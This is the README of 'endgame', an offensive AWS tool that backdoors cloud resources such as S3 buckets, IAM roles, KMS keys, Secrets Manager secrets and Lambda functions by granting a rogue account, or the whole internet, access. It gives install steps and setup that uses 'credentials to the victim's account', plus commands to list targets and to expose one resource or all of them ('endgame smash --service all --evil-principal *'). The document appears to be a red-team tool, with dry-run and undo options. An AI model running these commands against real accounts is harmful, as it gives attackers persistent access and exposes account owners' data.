# endgame

Use a one-liner command to backdoor an AWS account's resources with a rogue AWS Account - or to the entire internet 😈

**TLDR**: `endgame smash --service all` to create backdoors across your entire AWS account - either to a rogue IAM user/role or to the entire internet.

```bash
# this will ruin your day
endgame smash --service all --evil-principal *
# This will show you how your day could have been ruined
endgame smash --service all --evil-principal * --dry-run
# Atone for your sins
endgame smash --service all --evil-principal * --undo
# Consider maybe atoning for your sins
endgame smash --service all --evil-principal * --undo --dry-run
```

## Supported Backdoors

| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
|-------------------------------|---------|-------------------------        |
| ACM PCA                       | ✅     | ❌                              |
| CloudWatch Resource Policies  | ✅     | ❌                              |
| ECR Repositories              | ✅     | ❌                              |
| EFS File Systems              | ✅     | ❌                              |
| ElasticSearch Domains         | ✅     | ❌                              |
| Glacier Vault Access Policies | ✅     | ❌                              |
| IAM Roles                     | ✅     | ✅                              |
| KMS Keys                      | ✅     | ✅                              |
| Lambda Functions              | ✅     | ✅                              |
| Lambda Layers                 | ✅     | ✅                              |
| S3 Buckets                    | ✅     | ✅                              |
| Secrets Manager Secrets       | ✅     | ✅                              |
| SES Identity Policies         | ✅     | ❌                              |
| SQS Queues                    | ✅     | ✅                              |
| SNS Topics                    | ✅     | ❌                              |

## Tutorial

### Installation

```bash
python3 -m venv ./venv && source venv/bin/activate
python3 -m pip install -r requirements.txt
python3 -m pip install -q ./dist/endgame*.tar.gz
```

### Setup

* First, authenticate to AWS CLI using credentials to the victim's account.

* Set the environment variables for `EVIL_PRINCIPAL` (required). Optionally, set the environment variables for `AWS_REGION` and `AWS_PROFILE`

```bash
# Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or 
# Role that you want to give access to.
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

# If you don't supply these values, these will be the defaults.
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

### Demo Infrastructure

* Create the Terraform demo infrastructure

This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you.

> 🚨This will create real AWS infrastructure and will cost you money! 🚨

```bash
```bash
# To create the demo infrastructure
make terraform-demo
```

> _Note: It is not exposed to rogue IAM users or to the internet at first. That will only happen after you run the exposure commands._

### List Victim Resources

You can use the `list-resources` command to list resources in the account that you can backdoor.

* Examples:

```bash
# List IAM Roles, so you can create a backdoor via their AssumeRole policies
endgame list-resources -s iam

# List S3 buckets, so you can create a backdoor via their Bucket policies 
endgame list-resources --service s3
```

### Backdoor specific resources

* Use the `--dry-run` command first to test it without modifying anything:

```bash
endgame expose --service iam --name test-resource-exposure --dry-run
```

* To create the backdoor to that resource from your rogue account

> 🚨this is not a drill🚨

```
endgame expose --service iam --name test-resource-exposure
```

Example output:

> ![Expose for real](docs/images/add-myself-foreal.png)

* If you want to atone for your sins (optional) you can use the `--undo` flag to roll back the changes.

```bash
endgame expose --service iam --name test-resource-exposure --undo
```

> ![Expose undo](docs/images/add-myself-undo.png)

### Expose everything

```bash
endgame smash --service all --dry-run
endgame smash --service all
endgame smash --service all --undo
```

### Destroy Demo Infrastructure

* Now that you are done with the tutorial, don't forget to clean up the demo infrastructure.

```bash
# Destroy the demo infrastructure
make terraform-destroy
```

## Current Resource Support Statuses

### Backdoors via Resource-based Policies

| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
|-------------------------------|---------|-------------------------        |
| ACM PCA                       | ✅     | ❌                              |
| CloudWatch Resource Policies  | ✅     | ❌                              |
| ECR Repositories              | ✅     | ❌                              |
| EFS File Systems              | ✅     | ❌                              |
| ElasticSearch Domains         | ✅     | ❌                              |
| Glacier Vault Access Policies | ✅     | ❌                              |
| IAM Roles                     | ✅     | ✅                              |
| KMS Keys                      | ✅     | ✅                              |
| Lambda Functions              | ✅     | ✅                              |
| Lambda Layers                 | ✅     | ✅                              |
| S3 Buckets                    | ✅     | ✅                              |
| Secrets Manager Secrets       | ✅     | ✅                              |
| SES Identity Policies         | ✅     | ❌                              |
| SQS Queues                    | ✅     | ✅                              |
| SNS Topics                    | ✅     | ❌                              |

### Backdoors via Sharing APIs

| Backdoored Resource Type      | Support Status |
|-------------------------------|----------------|
| EC2 AMIs                      | ❌             |
| EBS Snapshots                 | ❌             |
| RDS Snapshots                 | ❌             |
| RDS DB Cluster Snapshots      | ❌             |


## Contributing

## Testing

### Unit tests

* Run [pytest](https://docs.pytest.org/en/stable/) with the following:

```bash
make test
```

### Security tests

* Run [bandit](https://bandit.readthedocs.io/en/latest/) with the following:

```bash
make security-test
```

### Integration tests

After making any modifications to the program, you can run a full-fledged integration test, using this program against your own test infrastructure in AWS.

* First, set your environment variables

```bash
# Set the environment variable for the username that you will create a backdoor for.
export EVIL_PRINCIPAL="arn:aws:iam::999988887777:user/evil"
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

* Then run the full-fledged integration test:

```bash
make integration-test
```

This does the following:
* Sets up your local dev environment (see `setup-dev`) in the `Makefile`
* Creates the Terraform infrastructure (see `terraform-demo` in the `Makefile`)
* Runs `list-resources`, `exploit --dry-run`, and `expose` against this live infrastructure
* Destroys the Terraform infrastructure (see `terraform-destroy` in the `Makefile`)

Note that the `expose` command will not expose the resources to the world - it will only expose them to your rogue user, not to the world.

# References

* [AWS Exposable Resources](https://github.com/SummitRoute/aws_exposable_resources)

* [Moto: A library that allows you to easily mock out tests based on AWS Infrastructure](http://docs.getmoto.org/en/latest/docs/moto_apis.html)

* [Moto Unit tests - a  great way to get examples of how they mock the creation of AWS resources](https://github.com/spulec/moto/blob/master/tests)

* [Paginators](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/paginators.html)

* [Exception handling for specific AWS Services](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/error-handling.html#parsing-error-responses-and-catching-exceptions-from-aws-services)

[1]: https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html